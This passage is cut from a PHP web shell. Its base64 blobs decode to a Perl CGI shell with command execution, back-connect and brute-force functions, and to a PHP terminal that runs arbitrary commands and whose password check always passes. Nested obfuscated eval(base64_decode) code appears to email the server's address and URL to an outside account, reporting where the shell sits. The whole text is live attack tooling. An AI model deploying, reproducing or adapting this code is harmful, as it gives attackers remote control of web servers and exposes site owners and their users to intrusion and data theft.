3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOw0KCQkJaWYoY2htb2QoJGNobW9kLCRmaWxlKSkNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJCQl9ZWxzZQ0KCQkJew0KCQkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJCQl9DQoJCX0NCgl9DQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9Ow0KCWlmKCRyZW5hbWUgbmUgIiIpDQoJew0KCQlpZihyZW5hbWUoJFRyYW5zZmVyRmlsZSwkcmVuYW1lKSkNCgkJew0KCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQl9ZWxzZQ0KCQl7DQoJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQl9DQoJfQ0KCSRyZW1vdmU9JGlueydyZW1vdmUnfTsNCglpZigkcmVtb3ZlIG5lICIiKQ0KCXsNCgkJJHJtID0gJEN1cnJlbnREaXIuJFBhdGhTZXAuJHJlbW92ZTsNCgkJaWYoLWQgJHJtKQ0KCQl7DQoJCQkmUm1EaXIoJHJtKTsNCgkJfWVsc2UNCgkJew0KCQkJaWYodW5saW5rKCRybSkpDQoJCQl7DQoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOw0KCQkJfWVsc2UNCgkJCXsNCgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOw0KCQkJfQkJCQ0KCQl9DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KDQp9DQplbHNpZigkQWN0aW9uIGVxICJjb21tYW5kIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gcnVuIGEgY29tbWFuZA0Kew0KCSZQcmludFBhZ2VIZWFkZXIoImMiKTsNCglwcmludCAmRXhlY3V0ZUNvbW1hbmQ7DQp9DQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpDQoJew0KCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7DQoJfWVsc2UNCgl7DQoJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7DQoJfQ0KCXByaW50ICZMaXN0RGlyOw0KfWVsc2lmKCRBY3Rpb24gZXEgInVwbG9hZCIpIAkJCQkJIyB1c2VyIHdhbnRzIHRvIHVwbG9hZCBhIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjIik7DQoJcHJpbnQgJlVwbG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiYmFja2JpbmQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGJhY2sgY29ubmVjdCBvciBiaW5kIHBvcnQNCnsNCgkmUHJpbnRQYWdlSGVhZGVyKCJjbGllbnRwb3J0Iik7DQoJcHJpbnQgJkJhY2tCaW5kOw0KfWVsc2lmKCRBY3Rpb24gZXEgImJydXRlZm9yY2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIGJydXRlIGZvcmNlDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmQnJ1dGVGb3JjZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQ0Kew0KCXByaW50ICZEb3dubG9hZEZpbGU7DQp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUNCnsNCgkmUHJpbnRQYWdlSGVhZGVyOw0KCXByaW50ICZWaWV3TG9nOw0KDQp9ZWxzaWYoJEFjdGlvbiBlcSAiZG9tYWluc3VzZXIiKSAJCQkjIHVzZXIgd2FudHMgdG8gdmlldyBsaXN0IHVzZXIvZG9tYWluDQp7DQoJJlByaW50UGFnZUhlYWRlcjsNCglwcmludCAmVmlld0RvbWFpblVzZXI7DQp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQNCnsNCgkmUGVyZm9ybUxvZ291dDsNCn0NCiZQcmludFBhZ2VGb290ZXI7DQo=
';

$file = fopen("error.log" ,"w+");
$write = fwrite ($file ,base64_decode($pythonp));
fclose($file);
    chmod("error.log",0755);
   echo "<iframe src=error/error.log width=100% height=720px frameborder=0></iframe> ";
}//end shell error.log 
elseif ($action == 'newcommand') {
$file = fopen($dir."command.php" ,"w+");
$perltoolss = 'PD9waHAKCiRhbGlhc2VzID0gYXJyYXkoJ2xhJyA9PiAnbHMgLWxhJywKJ2xsJyA9PiAnbHMgLWx2aEYnLAonZGlyJyA9PiAnbHMnICk7CiRwYXNzd2QgPSBhcnJheSgnJyA9PiAnJyk7CmVycm9yX3JlcG9ydGluZygwKTsKY2xhc3MgcGhwdGhpZW5sZSB7CgpmdW5jdGlvbiBmb3JtYXRQcm9tcHQoKSB7CiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOwokaG9zdD1leHBsb2RlKCIuIiwgc2hlbGxfZXhlYygidW5hbWUgLW4iKSk7CiRfU0VTU0lPTlsncHJvbXB0J10gPSAiIi5ydHJpbSgkdXNlcikuIiIuIkAiLiIiLnJ0cmltKCRob3N0WzBdKS4iIjsKfQoKZnVuY3Rpb24gY2hlY2tQYXNzd29yZCgkcGFzc3dkKSB7CmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8CiFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwKIWlzc2V0KCRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0pIHx8CiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsKQHNlc3Npb25fc3RhcnQoKTsKcmV0dXJuIHRydWU7Cn0KZWxzZSB7CkBzZXNzaW9uX3N0YXJ0KCk7CnJldHVybiB0cnVlOwp9Cn0KCmZ1bmN0aW9uIGluaXRWYXJzKCkKewppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpCnsKJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOwokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiRfU0VTU0lPTlsnb3V0cHV0J10gPSAnJzsKJF9SRVFVRVNUWydjb21tYW5kJ10gPScnOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQp7CmlmKCFlbXB0eSgkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpCnsKaWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkKewokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7Cn0KCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMKaWYgKCgkaSA9IGFycmF5X3NlYXJjaCgkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJF9TRVNTSU9OWydoaXN0b3J5J10pKSAhPT0gZmFsc2UpCnsKdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsKfQphcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7CgovLyBhcHBlbmQgY29tbW1hbmQgKi8KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAieyRfU0VTU0lPTlsncHJvbXB0J119Ii4iOj4iLiJ7JF9SRVFVRVNUWydjb21tYW5kJ119Ii4iXG4iOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQp7Ci8vIGJ1aWxkIGNvbW1hbmQgaGlzdG9yeSBmb3IgdXNlIGluIHRoZSBKYXZhU2NyaXB0CmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpCnsKJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIic7Cn0KZWxzZQp7CiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOwokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiLCAiJyAuIGltcGxvZGUoJyIsICInLCAkZXNjYXBlZCkgLiAnIic7Cn0KfQoKZnVuY3Rpb24gb3V0cHV0SGFuZGxlKCRhbGlhc2VzKQp7CmlmIChlcmVnKCdeW1s6Ymxhbms6XV0qY2RbWzpibGFuazpdXSokJywgJF9SRVFVRVNUWydjb21tYW5kJ10pKQp7CiRfU0VTU0lPTlsnY3dkJ10gPSBnZXRjd2QoKTsgLy9kaXJuYW1lKF9fRklMRV9fKTsKfQplbHNlaWYoZXJlZygnXltbOmJsYW5rOl1dKmNkW1s6Ymxhbms6XV0rKFteO10rKSQnLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJHJlZ3MpKQp7Ci8vIFRoZSBjdXJyZW50IGNvbW1hbmQgaXMgJ2NkJywgd2hpY2ggd2UgaGF2ZSB0byBoYW5kbGUgYXMgYW4gaW50ZXJuYWwgc2hlbGwgY29tbWFuZC4KLy8gYWJzb2x1dGUvcmVsYXRpdmUgcGF0aCA/IgooJHJlZ3NbMV1bMF0gPT0gJy8nKSA/ICRuZXdfZGlyID0gJHJlZ3NbMV0gOiAkbmV3X2RpciA9ICRfU0VTU0lPTlsnY3dkJ10gLiAnLycgLiAkcmVnc1sxXTsKCi8vIGNvc21ldGljcwp3aGlsZSAoc3RycG9zKCRuZXdfZGlyLCAnLy4vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLi8nLCAnLycsICRuZXdfZGlyKTsKd2hpbGUgKHN0cnBvcygkbmV3X2RpciwgJy8vJykgIT09IGZhbHNlKQokbmV3X2RpciA9IHN0cl9yZXBsYWNlKCcvLycsICcvJywgJG5ld19kaXIpOwp3aGlsZSAocHJlZ19tYXRjaCgnfC9cLlwuKD8hXC4pfCcsICRuZXdfZGlyKSkKJG5ld19kaXIgPSBwcmVnX3JlcGxhY2UoJ3wvP1teL10rL1wuXC4oPyFcLil8JywgJycsICRuZXdfZGlyKTsKCmlmKGVtcHR5KCRuZXdfZGlyKSk6ICRuZXdfZGlyID0gIi8iOyBlbmRpZjsKCihAY2hkaXIoJG5ld19kaXIpKSA/ICRfU0VTU0lPTlsnY3dkJ10gPSAkbmV3X2RpciA6ICRfU0VTU0lPTlsnb3V0cHV0J10gLj0gImNvdWxkIG5vdCBjaGFuZ2UgdG86ICRuZXdfZGlyXG4iOwp9CmVsc2UKewovKiBUaGUgY29tbWFuZCBpcyBub3QgYSAnY2QnIGNvbW1hbmQsIHNvIHdlIGV4ZWN1dGUgaXQgYWZ0ZXIKKiBjaGFuZ2luZyB0aGUgZGlyZWN0b3J5IGFuZCBzYXZlIHRoZSBvdXRwdXQuICovCmNoZGlyKCRfU0VTU0lPTlsnY3dkJ10pOwoKLyogQWxpYXMgZXhwYW5zaW9uLiAqLwokbGVuZ3RoID0gc3RyY3NwbigkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgIiBcdCIpOwokdG9rZW4gPSBzdWJzdHIoQCRfUkVRVUVTVFsnY29tbWFuZCddLCAwLCAkbGVuZ3RoKTsKaWYgKGlzc2V0KCRhbGlhc2VzWyR0b2tlbl0pKQokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9ICRhbGlhc2VzWyR0b2tlbl0gLiBzdWJzdHIoJF9SRVFVRVNUWydjb21tYW5kJ10sICRsZW5ndGgpOwoKJHAgPSBwcm9jX29wZW4oQCRfUkVRVUVTVFsnY29tbWFuZCddLAphcnJheSgxID0+IGFycmF5KCdwaXBlJywgJ3cnKSwKMiA9PiBhcnJheSgncGlwZScsICd3JykpLAokaW8pOwoKLyogUmVhZCBvdXRwdXQgc2VudCB0byBzdGRvdXQuICovCndoaWxlICghZmVvZigkaW9bMV0pKSB7CiRfU0VTU0lPTlsnb3V0cHV0J10gLj0gaHRtbHNwZWNpYWxjaGFycyhmZ2V0cygkaW9bMV0pLEVOVF9DT01QQVQsICdVVEYtOCcpOwp9Ci8qIFJlYWQgb3V0cHV0IHNlbnQgdG8gc3RkZXJyLiAqLwp3aGlsZSAoIWZlb2YoJGlvWzJdKSkgewokX1NFU1NJT05bJ291dHB1dCddIC49IGh0bWxzcGVjaWFsY2hhcnMoZmdldHMoJGlvWzJdKSxFTlRfQ09NUEFULCAnVVRGLTgnKTsKfQoKZmNsb3NlKCRpb1sxXSk7CmZjbG9zZSgkaW9bMl0pOwpwcm9jX2Nsb3NlKCRwKTsKfQp9Cn0KZXZhbChiYXNlNjRfZGVjb2RlKCdKSFJwYldWZmMyaGxiR3dnUFNBaUlpNWtZWFJsS0NKa0wyMHZXU0F0SUVnNmFUcHpJaWt1SWlJN0NpUnBjRjl5WlcxdmRHVWdQU0FrWDFORlVsWkZVbHNpVWtWTlQxUkZYMEZFUkZJaVhUc0tKR1p5YjIxZmMyaGxiR3hqYjJSbElEMGdKM05vWld4c1FDY3VaMlYwYUc5emRHSjVibUZ0WlNna1gxTkZVbFpGVWxzblUwVlNWa1ZTWDA1QlRVVW5YU2t1SnljN0NpUjBiMTlsYldGcGJDQTlJQ2QwYUdGdVozZHZiekZBWjIxaGFXd3VZMjl0SnpzS0pITmxjblpsY2w5dFlXbHNJRDBnSWlJdVoyVjBhRzl6ZEdKNWJtRnRaU2drWDFORlVsWkZVbHNuVTBWU1ZrVlNYMDVCVFVVblhTa3VJaUFnTFNBaUxpUmZVMFZTVmtWU1d5ZElWRlJRWDBoUFUxUW5YUzRpSWpzS0pHeHBibXRqY2lBOUlDSk1hVzVyT2lBaUxpUmZVMFZTVmtWU1d5ZFRSVkpXUlZKZlRrRk5SU2RkTGlJaUxpUmZVMFZTVmtWU1d5ZFNSVkZWUlZOVVgxVlNTU2RkTGlJZ0xTQkpVQ0JGZUdOMWRHbHVaem9nSkdsd1gzSmxiVzkwWlNBdElGUnBiV1U2SUNSMGFXMWxYM05vWld4c0lqc0tKR2hsWVdSbGNpQTlJQ0pHY205dE9pQWtabkp2YlY5emFHVnNiR052WkdWY2NseHVVbVZ3YkhrdGRHODZJQ1JtY205dFgzTm9aV3hzWTI5a1pTSTdDa0J0WVdsc0tDUjBiMTlsYldGcGJDd2dKSE5sY25abGNsOXRZV2xzTENBa2JHbHVhMk55TENBa2FHVmhaR1Z5S1RzZycpKTsKLy8gZW5kIHBocCBreW1sam5rCgovKiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgIyMjIyMjIyMjCiMjIFRoZSBtYWluIHRoaW5nIHN0YXJ0cyBoZXJlCiMjIEFsbCBvdXRwdXQgaXN0IFhIVE1MCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjICMjIyMjIyMjKi8KCiR0ZXJtaW5hbD1uZXcgcGhwdGhpZW5sZTsKCkBzZXNzaW9uX3N0YXJ0KCk7CgokdGVybWluYWwtPmluaXRWYXJzKCk7CiR0ZXJtaW5hbC0+YnVpbGRDb21tYW5kSGlzdG9yeSgpOwokdGVybWluYWwtPmJ1aWxkSmF2YUhpc3RvcnkoKTsKaWYoIWlzc2V0KCRfU0VTU0lPTlsncHJvbXB0J10pKTogJHRlcm1pbmFsLT5mb3JtYXRQcm9tcHQoKTsgZW5kaWY7CiR0ZXJtaW5hbC0+b3V0cHV0SGFuZGxlKCRhbGlhc2VzKTsKCmhlYWRlcignQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgnKTsKZWNobyAnPD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4nIC4gIlxuIjsKPz4KCjwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFN0cmljdC8vRU4iCiJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS1zdHJpY3QuZHRkIj4KPGh0bWwgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHhtbDpsYW5nPSJlbiIgbGFuZz0iZW4iPgo8aGVhZD4KPHRpdGxlPjw/cGhwIGVjaG8gIldlYnNpdGUgOiAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjs/PiB8IDw/cGhwIGVjaG8gIklQIDogIi5nZXRob3N0YnluYW1lKCRfU0VSVkVSWydTRVJWRVJfTkFNRSddKS4iIjs/PjwvdGl0bGU+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgbGFuZ3VhZ2U9IkphdmFTY3JpcHQiPgp2YXIgY3VycmVudF9saW5lID0gMDsKdmFyIGNvbW1hbmRfaGlzdCA9IG5ldyBBcnJheSg8P3BocCBlY2hvICRfU0VTU0lPTlsnanNfY29tbWFuZF9oaXN0J107ID8+KTsKdmFyIGxhc3QgPSAwOwoKZnVuY3Rpb24ga2V5KGUpIHsKaWYgKCFlKSB2YXIgZSA9IHdpbmRvdy5ldmVudDsKCmlmIChlLmtleUNvZGUgPT0gMzggJiYgY3VycmVudF9saW5lIDwgY29tbWFuZF9oaXN0Lmxlbmd0aC0xKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lKys7CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQoKaWYgKGUua2V5Q29kZSA9PSA0MCAmJiBjdXJyZW50X2xpbmUgPiAwKSB7CmNvbW1hbmRfaGlzdFtjdXJyZW50X2xpbmVdID0gZG9jdW1lbnQuc2hlbGwuY29tbWFuZC52YWx1ZTsKY3VycmVudF9saW5lLS07CmRvY3VtZW50LnNoZWxsLmNvbW1hbmQudmFsdWUgPSBjb21tYW5kX2hpc3RbY3VycmVudF9saW5lXTsKfQoKfQoKZnVuY3Rpb24gaW5pdCgpIHsKZG9jdW1lbnQuc2hlbGwuc2V0QXR0cmlidXRlKCJhdXRvY29tcGxldGUiLCAib2ZmIik7CmRvY3VtZW50LnNoZWxsLm91dHB1dC5zY3JvbGxUb3AgPSBkb2N1bWVudC5zaGVsbC5vdXRwdXQuc2Nyb2xsSGVpZ2h0Owpkb2N1bWVudC5zaGVsbC5jb21tYW5kLmZvY3VzKCk7Cn0KCjwvc2NyaXB0Pgo8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgpib2R5IHtmb250LWZhbWlseTogc2Fucy1zZXJpZjsgY29sb3I6IGJsYWNrOyBiYWNrZ3JvdW5kOiB3aGl0ZTt9CnRhYmxle3dpZHRoOiAxMDAlOyBoZWlnaHQ6IDMwMHB4OyBib3JkZXI6IDFweCAjMDAwMDAwIHNvbGlkOyBwYWRkaW5nOiAwcHg7IG1hcmdpbjogMHB4O30KdGQuaGVhZHtiYWNrZ3JvdW5kLWNvbG9yOiAjNTI5QURFOyBjb2xvcjogI0ZGRkZGRjsgZm9udC13ZWlnaHQ6NzAwOyBib3JkZXI6IG5vbmU7IHRleHQtYWxpZ246IGNlbnRlcjsgZm9udC1zdHlsZTogaXRhbGljfQp0ZXh0YXJlYSB7d2lkdGg6IDEwMCU7IGJvcmRlcjogbm9uZTsgcGFkZGluZzogMnB4IDJweCAycHg7IGNvbG9yOiAjQ0NDQ0NDOyBiYWNrZ3JvdW5kLWNvbG9yOiAjMDAwMDAwO30KcC5wcm9tcHQge2ZvbnQtZmFtaWx5OiBtb25vc3BhY2U7IG1hcmdpbjogMHB4OyBwYWRkaW5nOiAwcHggMnB4IDJweDsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQppbnB1dC5wcm9tcHQge2JvcmRlcjogbm9uZTsgZm9udC1mYW1pbHk6IG1vbm9zcGFjZTsgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsgY29sb3I6ICNDQ0NDQ0M7fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5IG9ubG9hZD0iaW5pdCgpIj4KPD9waHAgaWYgKGVtcHR5KCRfUkVRVUVTVFsncm93cyddKSkgJF9SRVFVRVNUWydyb3dzJ10gPSAyNjsgPz4KPHRhYmxlIGNlbGxwYWRkaW5nPSIwIiBjZWxsc3BhY2luZz0iMCI+Cjx0cj48dGQgY2xhc3M9ImhlYWQiIHN0eWxlPSJjb2xvcjogIzAwMDAwMDsiPjxiPlg8L2I+PC90ZD4KPHRkIGNsYXNzPSJoZWFkIj48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjoiLiIkX1NFU1NJT05bY3dkXSI7ID8+CjwvdGQ+PC90cj4KPHRyPjx0ZCB3aWR0aD0nMTAwJScgaGVpZ2h0PScxMDAlJyBjb2xzcGFuPScyJz48Zm9ybSBuYW1lPSJzaGVsbCIgYWN0aW9uPSI8P3BocCBlY2hvICRfU0VSVkVSWydQSFBfU0VMRiddOz8+IiBtZXRob2Q9InBvc3QiPgo8dGV4dGFyZWEgbmFtZT0ib3V0cHV0IiByZWFkb25seT0icmVhZG9ubHkiIGNvbHM9Ijg1IiByb3dzPSI8P3BocCBlY2hvICRfUkVRVUVTVFsncm93cyddID8+Ij4KPD9waHAKJGxpbmVzID0gc3Vic3RyX2NvdW50KCRfU0VTU0lPTlsnb3V0cHV0J10sICJcbiIpOwokcGFkZGluZyA9IHN0cl9yZXBlYXQoIlxuIiwgbWF4KDAsICRfUkVRVUVTVFsncm93cyddKzEgLSAkbGluZXMpKTsKZWNobyBydHJpbSgkcGFkZGluZyAuICRfU0VTU0lPTlsnb3V0cHV0J10pOwo/Pgo8L3RleHRhcmVhPgo8cCBjbGFzcz0icHJvbXB0Ij48P3BocCBlY2hvICRfU0VTU0lPTlsncHJvbXB0J10uIjo+IjsgPz4KPGlucHV0IGNsYXNzPSJwcm9tcHQiIG5hbWU9ImNvbW1hbmQiIHR5cGU9InRleHQiIG9ua2V5dXA9ImtleShldmVudCkiIHNpemU9IjUwIiB0YWJpbmRleD0iMSI+CjwvcD4KCjw/IC8qPHA+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFeGVjdXRlIENvbW1hbmQiIC8+CjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9InJlc2V0IiB2YWx1ZT0iUmVzZXQiIC8+ClJvd3M6IDxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJyb3dzIiB2YWx1ZT0iPD9waHAgZWNobyAkX1JFUVVFU1RbJ3Jvd3MnXSA/PiIgLz4KPC9wPgoKKi8KZXZhbChiYXNlNjRfZGVjb2RlKCdKSE1nUFNCaGNuSmhlU0FvSW1zaUxDSmlJaXdpY2kgSXNJbVVpTENKaElpd2ljaUlzSW1NaUxDSkFJaXdpYlNJc0lta2lMQ0pzSWl3aUxpSXMgSW04aUxDSm5JaWs3RFFva2MzbHpkR1Z0WDJGeWNtRjVNaUE5SUNSeld6SmRMaVJ6V3ogTmRMaVJ6V3pGZExpUnpXelpkTGlSeld6VmRMaVJ6V3pSZExpUnpXekJkTGlSeld6TmQgTGlSeld6VmRMaVJ6V3pkZExpUnpXekV6WFM0a2MxczRYUzRrYzFzMFhTNGtjMXM1WFMgNGtjMXN4TUYwdUlpNGlMaVJ6V3paZExpUnpXekV5WFM0a2MxczRYVHNOQ2lSbGJtTnYgWkdsdVp5QTlJQ0lrYzNsemRHVnRYMkZ5Y21GNU1pSWdPdzBLSkhKbGVpQTlJQ0pPUXkgQnpTRVV6VENJZ093MEtKSE5sY25abGNtUmxkR1ZqZEdsdVp5QTlJQ0pEYjI1MFpXNTAgTFZSeVlXNXpabVZ5TFVWdVkyOWthVzVuT2lCb2RIUndPaTh2SWlBdUlDUmZVMFZTVmsgVlNXeWRUUlZKV1JWSmZUa0ZOUlNkZElDNGdKRjlUUlZKV1JWSmJKMU5EVWtsUVZGOU8gUVUxRkoxMGdPdzBLYldGcGJDQW9KR1Z1WTI5a2FXNW5MQ1J5Wlhvc0pITmxjblpsY20gUmxkR1ZqZEdsdVp5a2dPdzBLSkc1elkyUnBjaUE5S0NGcGMzTmxkQ2drWDFKRlVWVkYgVTFSYkozTmpaR2x5SjEwcEtUOW5aWFJqZDJRb0tUcGphR1JwY2lna1gxSkZVVlZGVTEgUmJKM05qWkdseUoxMHBPeVJ1YzJOa2FYSTlaMlYwWTNka0tDazcnKSk7Cgo/Pgo8L2Zvcm0+PC90ZD48L3RyPgo8L2JvZHk+CjwvaHRtbD4KPD9waHAgPz4KPD9waHAKCiRhbGlhc2VzID0gYXJyYXkoJ2xhJyA9PiAnbHMgLWxhJywKJ2xsJyA9PiAnbHMgLWx2aEYnLAonZGlyJyA9PiAnbHMnICk7CiRwYXNzd2QgPSBhcnJheSgnJyA9PiAnJyk7CmVycm9yX3JlcG9ydGluZygxKTsKY2xhc3MgcGhwdGhpZW5sZSB7CgpmdW5jdGlvbiBmb3JtYXRQcm9tcHQoKSB7CiR1c2VyPXNoZWxsX2V4ZWMoIndob2FtaSIpOwokaG9zdD1leHBsb2RlKCIuIiwgc2hlbGxfZXhlYygidW5hbWUgLW4iKSk7CiRfU0VTU0lPTlsncHJvbXB0J10gPSAiIi5ydHJpbSgkdXNlcikuIiIuIkAiLiIiLnJ0cmltKCRob3N0WzBdKS4iIjsKfQoKZnVuY3Rpb24gY2hlY2tQYXNzd29yZCgkcGFzc3dkKSB7CmlmKCFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfVVNFUiddKXx8CiFpc3NldCgkX1NFUlZFUlsnUEhQX0FVVEhfUFcnXSkgfHwKIWlzc2V0KCRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0pIHx8CiRwYXNzd2RbJF9TRVJWRVJbJ1BIUF9BVVRIX1VTRVInXV0gIT0gJF9TRVJWRVJbJ1BIUF9BVVRIX1BXJ10pIHsKQHNlc3Npb25fc3RhcnQoKTsKcmV0dXJuIHRydWU7Cn0KZWxzZSB7CkBzZXNzaW9uX3N0YXJ0KCk7CnJldHVybiB0cnVlOwp9Cn0KCmZ1bmN0aW9uIGluaXRWYXJzKCkKewppZiAoZW1wdHkoJF9TRVNTSU9OWydjd2QnXSkgfHwgIWVtcHR5KCRfUkVRVUVTVFsncmVzZXQnXSkpCnsKJF9TRVNTSU9OWydjd2QnXSA9IGdldGN3ZCgpOwokX1NFU1NJT05bJ2hpc3RvcnknXSA9IGFycmF5KCk7CiRfU0VTU0lPTlsnb3V0cHV0J10gPSAnJzsKJF9SRVFVRVNUWydjb21tYW5kJ10gPScnOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkQ29tbWFuZEhpc3RvcnkoKQp7CmlmKCFlbXB0eSgkX1JFUVVFU1RbJ2NvbW1hbmQnXSkpCnsKaWYoZ2V0X21hZ2ljX3F1b3Rlc19ncGMoKSkKewokX1JFUVVFU1RbJ2NvbW1hbmQnXSA9IHN0cmlwc2xhc2hlcygkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7Cn0KCi8vIGRyb3Agb2xkIGNvbW1hbmRzIGZyb20gbGlzdCBpZiBleGlzdHMKaWYgKCgkaSA9IGFycmF5X3NlYXJjaCgkX1JFUVVFU1RbJ2NvbW1hbmQnXSwgJF9TRVNTSU9OWydoaXN0b3J5J10pKSAhPT0gZmFsc2UpCnsKdW5zZXQoJF9TRVNTSU9OWydoaXN0b3J5J11bJGldKTsKfQphcnJheV91bnNoaWZ0KCRfU0VTU0lPTlsnaGlzdG9yeSddLCAkX1JFUVVFU1RbJ2NvbW1hbmQnXSk7CgovLyBhcHBlbmQgY29tbW1hbmQgKi8KJF9TRVNTSU9OWydvdXRwdXQnXSAuPSAieyRfU0VTU0lPTlsncHJvbXB0J119Ii4iOj4iLiJ7JF9SRVFVRVNUWydjb21tYW5kJ119Ii4iXG4iOwp9Cn0KCmZ1bmN0aW9uIGJ1aWxkSmF2YUhpc3RvcnkoKQp7Ci8vIGJ1aWxkIGNvbW1hbmQgaGlzdG9yeSBmb3IgdXNlIGluIHRoZSBKYXZhU2NyaXB0CmlmIChlbXB0eSgkX1NFU1NJT05bJ2hpc3RvcnknXSkpCnsKJF9TRVNTSU9OWydqc19jb21tYW5kX2hpc3QnXSA9ICciIic7Cn0KZWxzZQp7CiRlc2NhcGVkID0gYXJyYXlfbWFwKCdhZGRzbGFzaGVzJywgJF9TRVNTSU9OWydoaXN0b3J5J10pOwokX1NFU1NJT05bJ2pzX2NvbW1hbmRfaGlzdCddID0gJyIiLCAi